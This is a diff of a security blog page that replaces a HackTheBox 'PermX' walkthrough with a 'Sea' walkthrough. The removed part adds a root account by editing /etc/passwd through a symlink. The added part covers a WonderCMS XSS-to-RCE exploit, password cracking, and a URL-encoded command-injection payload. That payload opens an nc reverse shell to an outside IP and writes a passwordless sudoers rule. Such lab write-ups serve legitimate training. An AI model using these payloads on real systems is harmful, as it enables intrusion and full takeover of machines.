@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>[WriteUp] HackTheBox - PermX | b0rgch3n's blog</title>
-  <meta name='description' content='PermX is a simple-difficulty box from HackTheBox 2024 Season 5.'>
+  <title>[WriteUp] HackTheBox - Sea | b0rgch3n's blog</title>
+  <meta name='description' content='Sea is a simple box from HackTheBox, Season 6 of 2024.'>
 
-  <link rel="canonical" href="https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/">
+  <link rel="canonical" href="https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/">
   <link rel="alternate" type="application/rss+xml" title="b0rgch3n&#39;s blog" href="/feed.xml">
 
   <!-- Fonts -->
@@ -246,7 +246,7 @@
       
       <div class="col col-6 col-t-12">
         <div class="image-box">
-          <img class="post-image lazy" data-src="/images/cover/10.jpg" alt="[WriteUp] HackTheBox - PermX">
+          <img class="post-image lazy" data-src="/images/cover/02.jpg" alt="[WriteUp] HackTheBox - Sea">
         </div>
       </div>
       
@@ -258,14 +258,14 @@
             <span class="post__minutes">
               
               
-                3 min read
+                5 min read
               
               <time class="post__date"
-                datetime="2024-07-18T03:34:00+08:00">Jul 18, 2024</time>
+                datetime="2024-08-26T15:21:00+08:00">Aug 26, 2024</time>
             </span>
           </div>
         
-          <h2 class="post__title">[WriteUp] HackTheBox - PermX</h2>
+          <h2 class="post__title">[WriteUp] HackTheBox - Sea</h2>
         
           <div class="post__bottom">
         
@@ -300,219 +300,297 @@
   <article class="post animate">
 
     <div class="post__content">
-      <p>PermX is a simple-difficulty box from HackTheBox 2024 Season 5.</p>
+      <p>Sea is a simple box from HackTheBox’s Season 6 of 2024.</p>
 
 <hr />
 
 <h2 id="enumeration"><strong>Enumeration</strong></h2>
 
-<p>Let’s start with enumeration.</p>
+<p>As usual, the <strong>Nmap</strong> scan shows open ports 22 and 80.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-1.png" alt="" />
-  <em>Nmap scan</em></p>
+<p>We always know that SSH won’t be the first choice,<br />
+so let’s check out the web service first.</p>
 
-<p>The <strong>Nmap</strong> scan report shows open ports 22 and 80.</p>
+<p>We browse through each page of the web service but find nothing special.</p>
 
-<p>Port 80 is for the web service, which redirects to the domain “<strong>permx.htb</strong>”,<br />
-So we need to configure the hosts file first.</p>
-
-<p>Accessing the web service through a browser,<br />
-didn’t reveal any useful information for now.</p>
-
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-2.png" alt="" />
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-1.png" alt="" />
   <em>web page</em></p>
 
-<p>Directory enumeration on the web service was similarly disappointing.</p>
+<p>The only page that stands out is “<strong>contact.php</strong>”, which has a form.<br />
+Our instinct tells us that the Website field might be vulnerable to XSS or CSRF attacks.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-3.png" alt="" />
-  <em>dirsearch scan</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-2.png" alt="" />
+  <em>web page: /contact.php</em></p>
 
-<p>Tried using <strong>ffuf</strong> to enumerate subdomains.</p>
+<p>We scan all possible directories, starting from the root directory.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-4.png" alt="" />
-  <em>ffuf scan</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-3.png" alt="" />
+  <em>dirsearch scan: /</em></p>
 
-<p>Nice! Discovered the subdomain “<strong>lms.permx.htb</strong>”.<br />
-Add this domain to the hosts file as well.</p>
+<p>The root directory scan show four subdirectories:</p>
+<ul>
+  <li>data</li>
+  <li>messages</li>
+  <li>plugins</li>
+  <li>themes</li>
+</ul>
 
-<p>The web page is a login panel.</p>
+<p>Let’s scan these four directories and their subdirectories.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-5.png" alt="" />
-  <em>web page</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-4.png" alt="" />
+  <em>dirsearch scan: /data</em></p>
 
-<p>Directory enumeration again.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-5.png" alt="" />
+  <em>dirsearch scan: /plugins &amp; /messages</em></p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-6.png" alt="" />
-  <em>dirsearch scan</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-6.png" alt="" />
+  <em>dirsearch scan: /themes</em></p>
 
-<p>Review interesting directories from the <strong>robots.txt</strong> file.</p>
+<p>Some interesting information appears under the “<strong>/themes/bike</strong>” directory.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-7.png" alt="" />
-  <em>robots.txt</em></p>
+<p>“<strong>/themes/bike/summary</strong>” exposes the theme used by this CMS.</p>
 
-<p>Examining these directories one by one.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-7.png" alt="" />
+  <em>web page: /themes/bike/summary</em></p>
 
-<p>found that the “<strong>/documentation/changelog.html</strong>” page,<br />
-the detailed version number of the current web application: <strong>Chamilo 1.11.24</strong>.</p>
+<p>“<strong>/themes/bike/version</strong>” reveals the theme version used by the CMS.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-8.png" alt="" />
-  <em>information disclosure</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-8.png" alt="" />
+  <em>web page: /themes/bike/version</em></p>
+
+<p>“<strong>/themes/bike/LICENSE</strong>” exposes the CMS’s copyright information,<br />
+including the author’s name.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-9.png" alt="" />
+  <em>web page: /themes/bike/LICENSE</em></p>
 
 <hr />
 
 <h2 id="foothold"><strong>Foothold</strong></h2>
 
-<p>Google search for <strong>Chamilo</strong> vulnerabilities,<br />
-we found an RCE vulnerability for this version: <strong>CVE-2023-4220</strong>.</p>
+<p>We search for this information on GitHub and eventually identify the likely CMS through the author’s name.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-9.png" alt="" />
-  <em>google search result</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-10.png" alt="" />
+  <em>github search result</em></p>
 
-<p>The exploit script can be found on Github:<br />
-<a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc</a></p>
+<p>We suspect the CMS used here is “<strong>Wonder CMS</strong>”.<br />
+Let’s see if there’s an exploit script available for it.</p>
 
-<p>Use <strong>nc</strong> to listen and execute this exploit script to gain a reverse shell.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-11.png" alt="" />
+  <em>github search result</em></p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python3 main.py <span class="nt">-u</span> http://lms.permx.htb <span class="nt">-a</span> revshell</code></pre></figure>
+<p>Luckily, we find a CVE that matches the version number: <a href="https://github.com/insomnia-jacob/CVE-2023-41425">CVE-2023-41425</a><br />
+This is an exploit script that use an XSS vulnerability to achieve RCE.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-10.png" alt="" />
-<img src="/images/2024-07-17-writeup-hackthebox-permx/image-11.png" alt="" />
-  <em>set opetions and waiting exploit comleted</em></p>
+<p>By examining the source code,<br />
+we infer that there might be a link like “<strong>/index.php?page=loginURL</strong>”.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-12.png" alt="" />
-  <em>get the shell</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-12.png" alt="" />
+  <em>exploit source code</em></p>
 
-<p>We have a shell!</p>
+<p>Let’s visit this link.</p>
 
-<p>However, since the <strong>www-data</strong> user’s permissions are very limited,<br />
-we need a privilege escalation.</p>
+<p>Yes, it exists, confirming our suspicion that the web service indeed uses “<strong>Wonder CMS</strong>”.</p>
 
-<p>As usual, upload <strong>linpeas.sh</strong> and use it to gather information.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-13.png" alt="" />
+  <em>web page: /index.php?page=loginURL</em></p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-13.png" alt="" />
-  <em>users</em></p>
+<p>So, download and execute the exploit script.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-14.png" alt="" />
-  <em>password dsclosure</em></p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python3 exploit.py <span class="nt">-u</span> http://sea.htb/loginURL <span class="nt">-i</span> &lt;your_ip&gt; <span class="nt">-p</span> &lt;your_port&gt; <span class="nt">-r</span> http://&lt;your_ip&gt;:8000/main.zip</code></pre></figure>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-15.png" alt="" />
-  <em>another password dsclosure</em></p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-14.png" alt="" />
+  <em>run exploit script</em></p>
 
-<p>The information collected includes two leaked passwords:</p>
+<p>Enter the link provided by “<strong>Send the below link to admin</strong>” in the suspected location.</p>
 
-<figure class="highlight"><pre><code class="language-text" data-lang="text">gaufrette  
-03F6lY3uXAP2bkW8  </code></pre></figure>
+<p>Like this.</p>
 
-<p>Using the password “<strong>03F6lY3uXAP2bkW8</strong>” for SSH login, Successfully login as <strong>mtz</strong>.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-15.png" alt="" /></p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-16.png" alt="" />
-  <em>user shell</em></p>
+<p>Submit the form and wait a moment.</p>
 
-<p>obtaining a user shell.</p>
+<p>Yes! It worked.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-16.png" alt="" />
+  <em>www-data shell</em></p>
+
+<p>We obtained a “<strong>www-data</strong>” user shell.</p>
 
 <hr />
 
 <h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2>
 
-<p>The next goal is root privileges.<br />
-As usual, checking the SUDO information frist.</p>
+<p>As we know, the “<strong>www-data</strong>” user has very limited permissions.<br />
+We need to escalate privileges.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-17.png" alt="" />
-  <em>sudo -l</em></p>
+<p>Let’s explore the web file directory “<strong>/var/www/</strong>” to look for sensitive information.</p>
 
-<p>The terminal output shows that the current user is allowed to run the ‘<strong>/opt/acl.sh</strong>’ file with sudo without a password.</p>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-17.png" alt="" />
+  <em>check web files</em></p>
 
-<p>Next, inspect the <strong>acl.sh</strong> file.</p>
+<p>The file “<strong>/var/www/data/database.js</strong>” caught my attention.</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-18.png" alt="" />
+  <em>check database.js</em></p>
 
-<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-   /usr/bin/echo <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> user perm file"</span>
-   <span class="nb">exit </span>1
-<span class="k">fi
+<p>Do you see the “<strong>password</strong>” hash? That might be the breakthrough.</p>
 
-</span><span class="nv">user</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
-<span class="nv">perm</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
-<span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>
+<p>Copy the hash locally and use “<strong>John</strong>” to brute-force it.</p>
 
-<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">!=</span> /home/mtz/<span class="k">*</span> <span class="o">||</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>..<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-   /usr/bin/echo <span class="s2">"Access denied."</span>
-   <span class="nb">exit </span>1
-<span class="k">fi</span>
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-19.png" alt="" />
+  <em>crack password hash</em></p>
 
-<span class="c"># Check if the path is a file</span>
-<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-   /usr/bin/echo <span class="s2">"Target must be a file."</span>
-   <span class="nb">exit </span>1
-<span class="k">fi</span>
+<p>We got a password!</p>
 
-/usr/bin/sudo /usr/bin/setfacl <span class="nt">-m</span> u:<span class="s2">"</span><span class="nv">$user</span><span class="s2">"</span>:<span class="s2">"</span><span class="nv">$perm</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mychemicalromance</code></pre></figure>
 
-<p>The script’s logic involves using <strong>setfacl</strong> to set rwx permissions on a specified file for a given user, But there are filtering conditions on the file path (the third parameter):</p>
-<ul>
-  <li>The file path must be under “<strong>/home/mtz</strong>”</li>
-  <li>The file path cannot contain directory traversal symbols “<strong>..</strong>”</li>
-</ul>
+<p>Check which users are allowed to log in.</p>
 
-<p>OK, now let’s try to get a root privilege shell.</p>
-
-<p>My plan is to create a symbolic link to the “<strong>/etc/passwd</strong>” file in the “<strong>/home/mtz</strong>” directory, then edit the passwd file to add a privileged user.</p>
-
-<p>Generates a password HASH.</p>
-
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-18.png" alt="" />
-  <em>generate passwd hash</em></p>
-
-<p>Use the following commands to escalate privileges.</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ln</span> <span class="nt">-s</span> /etc/passwd passwd
-<span class="nb">sudo</span> /opt/acl.sh mtz rwx /home/mtz/tmp/passwd
-<span class="nb">echo</span> <span class="s1">'b0rgch3n:$1$zrd0hGa7$xs1GPMR4gl1lZE1lJwQt81:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> /home/mtz/tmp/passwd</code></pre></figure>
-
-<p>Check the passwd file to confirm the privileged account has been added.</p>
-
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-19.png" alt="" />
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-20.png" alt="" />
   <em>check passwd file</em></p>
 
-<p>Login with the privileged account.</p>
+<p>Besides the root user, “<strong>amay</strong>” or “<strong>geo</strong>” might be able to login.</p>
 
-<p><img src="/images/2024-07-17-writeup-hackthebox-permx/image-20.png" alt="" />
+<p>Try login by “<strong>amay</strong>”.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-21.png" alt="" />
+  <em>user shell</em></p>
+
+<p>We obtain a shell with user privileges!</p>
+
+<p>Next, we need to escalate to root.</p>
+
+<p>Let’s check <strong>sudo</strong> first.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-22.png" alt="" />
+  <em>check sudo</em></p>
+
+<p>The current user amay cannot use the sudo command.</p>
+
+<p>Upload <strong>linpeas.sh</strong> for a comprehensive enumeration.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-23.png" alt="" />
+  <em>SUID/SGID files</em></p>
+
+<p>Cross-reference the <strong>SUID/SGID</strong> information with <strong>GTFObin</strong>,<br />
+but nothing useful turns up for now.</p>
+
+<p>But the open ports reveal something interesting,<br />
+including ports <strong>8080</strong> and <strong>37309</strong>.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-24.png" alt="" />
+  <em>active ports</em></p>
+
+<p>Check out port <strong>8080</strong>, it’s also a web service.<br />
+It requires authentication, we can reuse <strong>amay</strong>’s username and password.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-25.png" alt="" />
+  <em>other web</em></p>
+
+<p>To make it easier to inspect through the browser,<br />
+we forward port 8080 on the remote machine to port 8080 on our local machine.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-v</span> <span class="nt">-N</span> <span class="nt">-L</span> 8080:localhost:8080 amay@sea.htb</code></pre></figure>
+
+<p>Then access it via the browser, it’s a system monitoring panel.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-26.png" alt="" />
+  <em>other web page</em></p>
+
+<p>The “<strong>Analyze Log File</strong>” feature allows access to log files with root permissions.</p>
+
+<p>After some testing,<br />
+we find that modifying the “<strong>log_file</strong>” parameter enables arbitrary file reading.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-27.png" alt="" />
+  <em>test log_file</em></p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-28.png" alt="" />
+  <em>result of test log_file</em></p>
+
+<p>Further testing the “<strong>log_file</strong>” parameter with <strong>BurpSuite</strong>.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-29.png" alt="" />
+  <em>test sep</em></p>
+
+<p>The parameter value can’t end with a “<strong>;</strong>” symbol.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-30.png" alt="" />
+  <em>test sep</em></p>
+
+<p>But it can end with “<strong>+#</strong>” (where “+” is URL-encoded as a space).</p>
+
+<p>Test modifying the parameter value to point to two different file paths.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/etc/passwd+/etc/hosts+#</code></pre></figure>
+
+<p>It still works, leading us to suspect that the web application might be using a tool like “cat” to read files.</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-31.png" alt="" />
+  <em>test double file</em></p>
+
+<p>Test again,<br />
+modifying the parameter value to include a command injection.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/etc/passwd+%26%26+id+#</code></pre></figure>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-32.png" alt="" />
+  <em>test command inject</em></p>
+
+<p>The command injection was successful.</p>
+
+<p>OK, let’s modify the payload to execute a reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/etc/passwd+%26%26+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%2014444%20%3E%2Ftmp%2Ff%3Bsleep+60+#</code></pre></figure>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-33.png" alt="" />
+  <em>try get shell</em></p>
+
+<p>It worked, but the connection dropped shortly after.</p>
+
+<p>We might need another method to gain a persistent root session.<br />
+I have a new idea: “<strong>Give amay sudo privileges</strong>”.</p>
+
+<p>Update the payload to modify the <strong>sudoers</strong> file.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/etc/passwd+%26%26+echo+<span class="s2">"amay+ALL=(ALL)+NOPASSWD:+ALL"</span>+&gt;+/etc/sudoers.d/amay+#</code></pre></figure>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-34.png" alt="" />
+  <em>try edit sudoer</em></p>
+
+<p>The amay user executes the sudo command, it worked!</p>
+
+<p>This is the final step: we obtain a root shell through the sudo command!</p>
+
+<p><img src="/images/2024-08-26-writeup-hackthebox-sea/image-35.png" alt="" />
   <em>root shell</em></p>
 
-<p>Gain a root privilege shell.</p>
+<p>:)</p>
 
-<p>Cheers!</p>
 
     </div>
 
     <div class="post__share">
       <div class="share__list">
-        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
 
-        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=[WriteUp]%20HackTheBox%20-%20PermX&url=https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=[WriteUp]%20HackTheBox%20-%20Sea&url=https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
 
-        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/&amp;media=https://b0rgch3n.github.io/images/cover/10.jpg&amp;description=[WriteUp]%20HackTheBox%20-%20PermX" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/&amp;media=https://b0rgch3n.github.io/images/cover/02.jpg&amp;description=[WriteUp]%20HackTheBox%20-%20Sea" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
       </div>
     </div>
 
     <div class="post__navigation">
       
-      <a class="prev" href="/2024/06/13/writeup-hackthebox-blurry/">
-        <img class="post__nav-image lazy" data-src="/images/cover/11.jpg" alt="[WriteUp] HackTheBox - Blurry">
-        <div class="post__nav-box">
-          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
-          <h4 class="post__nav__title">[WriteUp] HackTheBox - Blurry</h4>
-        </div>
-      </a>
-      
-      
-      <a class="next" href="/2024/08/02/writeup-hackthebox-boardlight/">
+      <a class="prev" href="/2024/08/02/writeup-hackthebox-boardlight/">
         <img class="post__nav-image lazy" data-src="/images/cover/09.jpg" alt="[WriteUp] HackTheBox - BoardLight">
         <div class="post__nav-box">
-          <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
           <h4 class="post__nav__title">[WriteUp] HackTheBox - BoardLight</h4>
         </div>
       </a>
+      
       
     </div>
 
@@ -541,66 +619,6 @@ As usual, checking the SUDO information frist.</p>
             
 
             
-
-            <div class="article col col-4 col-d-6 col-t-12 grid__post">
-              <div class="article__inner">
-
-                
-                <a class="article__image" href="/2024/08/26/writeup-hackthebox-sea/">
-                  <img class="lazy" data-src="/images/cover/02.jpg" alt="[WriteUp] HackTheBox - Sea">
-                </a>
-                
-
-                <div class="article__content">
-
-                  <div class="article__meta">
-                    <span class="article__minutes">
-                      
-                      
-                        4 min read
-                      
-                      <time class="article__date"
-                        datetime="2024-08-26T15:21:00+08:00">Aug 26, 2024</time>
-                    </span>
-                  </div>
-
-                  <h2 class="article__title">[WriteUp] HackTheBox - Sea</h2>
-
-                  <p class="article__excerpt">Sea is a simple box from HackTheBox, Season 6 of 2024.</p>
-
-                  <div class="article__bottom">
-
-                    
-                    <div class="article__author">
-                      <a href="/about/" aria-label="b0rgch3n"><img class="article__author-image lazy" data-src="/images/author.jpg" alt="b0rgch3n's Picture"></a>
-                    </div>
-                    
-
-                    <div class="article__bottom-meta">
-                      
-                        <a href="/about/" class="article__author-link">b0rgch3n</a>
-                      
-                      
-                      <span>in</span>
-                      <span class="article-tags">
-                        
-                          <a href="/tag/WriteUp" class="article__tag">WriteUp</a>
-                        
-                          <a href="/tag/Hack The Box" class="article__tag">Hack The Box</a>
-                        
-                      </span>
-                      
-                    </div>
-                  </div>
-
-                </div>
-
-              </div>
-            </div>
-
-            
-                
-              
             
             
             
@@ -675,6 +693,66 @@ As usual, checking the SUDO information frist.</p>
             
 
             
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2024/07/18/writeup-hackthebox-permx/">
+                  <img class="lazy" data-src="/images/cover/10.jpg" alt="[WriteUp] HackTheBox - PermX">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        3 min read
+                      
+                      <time class="article__date"
+                        datetime="2024-07-18T03:34:00+08:00">Jul 18, 2024</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">[WriteUp] HackTheBox - PermX</h2>
+
+                  <p class="article__excerpt">PermX is a simple-difficulty box from HackTheBox 2024 Season 5.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="b0rgch3n"><img class="article__author-image lazy" data-src="/images/author.jpg" alt="b0rgch3n's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">b0rgch3n</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/WriteUp" class="article__tag">WriteUp</a>
+                        
+                          <a href="/tag/Hack The Box" class="article__tag">Hack The Box</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
             
             
             
@@ -776,7 +854,7 @@ As usual, checking the SUDO information frist.</p>
           <span class="article__minutes">
             
             
-              4 min read
+              5 min read
             
           </span>
           <time class="article__date"
